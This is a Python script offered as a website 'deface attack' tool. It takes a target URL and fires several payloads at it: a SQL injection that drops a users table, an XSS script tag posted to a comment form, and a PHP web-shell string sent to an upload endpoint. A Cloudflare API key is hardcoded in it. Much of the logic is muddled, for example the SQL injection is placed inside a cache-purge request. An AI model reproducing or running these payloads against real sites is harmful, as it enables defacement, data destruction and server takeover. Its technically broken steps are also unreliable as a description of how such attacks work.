import requests

def deface_attack(target_url, html_file, api_key):
    try:
        response = requests.get(f"https://api.cloudflare.com/client/v4/zones?name={target_url}")
        zone_id = response.json()["result"][0]["id"]

        # SQL injection attack
        payload = {"zone_id": zone_id, "files": [{"url": f'{target_url}\'; DROP TABLE users; --', "content": html_file}]}
        headers = {"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"}

        response = requests.patch(f"https://api.cloudflare.com/client/v4/zones/{zone_id}/purge_cache", json=payload, headers=headers)

        if response.status_code == 200:
            print("Deface attack successful!")
        else:
            print("Deface attack failed.")

        # XSS deface attack
        xss_payload = f'<script src="{target_url}/cazzy.js"></script>'
        response = requests.post(f"{target_url}/comment", data={"comment": xss_payload})

        if response.status_code == 200:
            print("XSS deface attack successful!")
        else:
            print("XSS deface attack failed.")

        # Remote file execution
        rce_payload = f'<?php system($_GET["cmd"]); ?>'
        response = requests.get(f"{target_url}/upload.php?url=php://filter/convert.base64-encode/resource=index", params={"cmd": rce_payload})

        if response.status_code == 200:
            print("Remote file execution successful!")
        else:
            print("Remote file execution failed.")

    except Exception as e:
        print(f"Error: {str(e)}")

target_url = input("Target url: ")
html_file = open("cazzy.html").read()
api_key = "QGDVNr5pw0xoHXQnGZwhk8h-dsu_3gSQcBObqjxB"
deface_attack(target_url, html_file, api_key)